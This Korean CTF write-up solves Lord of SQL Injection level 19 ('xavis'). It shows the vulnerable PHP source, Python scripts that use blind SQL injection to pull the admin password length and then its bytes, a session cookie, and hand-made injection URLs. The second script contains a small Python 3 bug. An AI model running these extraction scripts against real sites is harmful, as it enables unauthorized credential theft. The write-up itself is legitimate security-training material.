# Lord of SQL Injection No.19 - xavis

## 문제 해결 방안

ASCII 코드가 아닌 코드로 되어있는 문자들로 이루어진 비밀번호를 Blind SQL Injection 할 수 있는지 확인한다.

## 소스 코드 분석
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/regex|like/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("xavis"); 
  highlight_file(__FILE__); 
?>
```
* preg_match로 pw의 문자열에 'prob','_','.','()','regex','like'를 필터링 해낸다.

* 직접 GET 방식으로 받은 pw의 값과 데이터 베이스의 pw가 같은지를 검사하여 확인한다. 즉 Blind SQL Injection 임을 알 수 있다.

## 문제 해결방안
```python
import urllib.request   # python 라이브러리에 내장된 urllib.request 를 불러온다.
from urllib.parse import quote

result = "" # pw 값을 저장할 문자열 변수
length = 0;
for A in range(1,1000):
    url = "http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw="
    add_url = "' or length(pw)={} -- -".format(str(A))
    add_url = quote(add_url)
    new_url = url + add_url
    re = urllib.request.Request(new_url)

    re.add_header("User-Agent","Mozilla/5.0")
    re.add_header("Cookie","PHPSESSID=ae1i7c038nndgup1torche1pt7")

    res = urllib.request.urlopen(re)

    if str(res.read()).find("Hello admin") != -1:
        length = A
        print("Length = {}".format(str(A)))
        break
    # 위의 코드로 pw의 LENGTH가 40이라는 것을 알 수 있었다.
for i in range(1,length):
    for j in range(ord('0'),ord('z')):
        url = "http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw="  # SQL Injection 공격 대상인 URL에서 변경되지 않는 부분이다.
        add_url = "' or id='admin' and substr(pw,1,{})='{}' -- ;".format(str(i), result+chr(j))
        print("Searching.. - {0}{1}".format(url, add_url))
        add_url = quote(add_url)
        new_url = url + add_url
        re = urllib.request.Request(new_url)

        re.add_header("User-Agent","Mozilla/5.0")
        re.add_header("Cookie", "PHPSESSID=ae1i7c038nndgup1torche1pt7")

        res = urllib.request.urlopen(re)

        if str(res.read()).find("Hello admin") != -1:
            result += chr(j).lower()
            print("Found it!! => " + result)
            break

        # 이 코드로 pw가 나오지 않는다는것을 확인하였다.
print("Finished Searching.")
print("Password : " + result)
```
pw의 문자가 나오지 않음을 보아 범위 안에 있는 문자가 아니거나 ascii 코드가 아님을 예상해보았다.

따라서 'http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw=%27%20or%20id=%27admin%27%20and%20ascii(substr(pw,1,1))=0%20--%20-' 를 입력해보아 ascii 문자가 아닌지 확인해 보았는데 역시나 아니였다.

4바이트 문자방식인지 확인해보기 위하여 아래 url을 입력하여 입력해보았다.
'http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw=%27%20or%20id=%27admin%27%20and%20length(mid(pw,1,1))=4%20--%20-'
했더니 Hello admin이 출력되는 것을 보아 4바이트 유니코드임을 알았다.

따라서 위의 코드를 유니코드에 해당되는 코드로 수정 하였다.

```python
import urllib.request   # python 라이브러리에 내장된 urllib.request 를 불러온다.
from urllib.parse import quote

result = "" # pw 값을 저장할 문자열 변수
length = 0;
for A in range(1,1000):
    url = "http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw="
    add_url = "' or length(pw)={} -- -".format(str(A))
    add_url = quote(add_url)
    new_url = url + add_url
    re = urllib.request.Request(new_url)

    re.add_header("User-Agent","Mozilla/5.0")
    re.add_header("Cookie","PHPSESSID=ae1i7c038nndgup1torche1pt7")

    res = urllib.request.urlopen(re)

    if str(res.read()).find("Hello admin") != -1:
        length = A
        print("Length = {}".format(str(A)))
        break

for i in range(1,(length/4)):
    for j in range(128,256): # unicode에 해당하는 문자 코드를 확인하기 위해 돌린다.
        url = "http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw="  # SQL Injection 공격 대상인 URL에서 변경되지 않는 부분이다.
        add_url = "' or id='admin' and ord(substr(pw,{},1))='{}' -- ;".format(str(i), str(j)) # sql 에서 ord함수는 문자열에 해당하는 문자 코드를 반환
        print("Searching.. - {0}{1}".format(url, add_url))
        add_url = quote(add_url)
        new_url = url + add_url
        re = urllib.request.Request(new_url)

        re.add_header("User-Agent","Mozilla/5.0")
        re.add_header("Cookie", "PHPSESSID=ae1i7c038nndgup1torche1pt7")

        res = urllib.request.urlopen(re)

        if str(res.read()).find("Hello admin") != -1:
            result += chr(j).lower()
            print("Found it!! => " + result)
            break

print("Finished Searching.")
print("Password : " + result)
```
위의 코드를 실행해 보니 결과물로 ¸ùÅ°ÆÐÄ¡¤»가 출력되고 …?pw=¸ùÅ°ÆÐÄ¡¤»를 입력하면 문제가 해결되게 된다.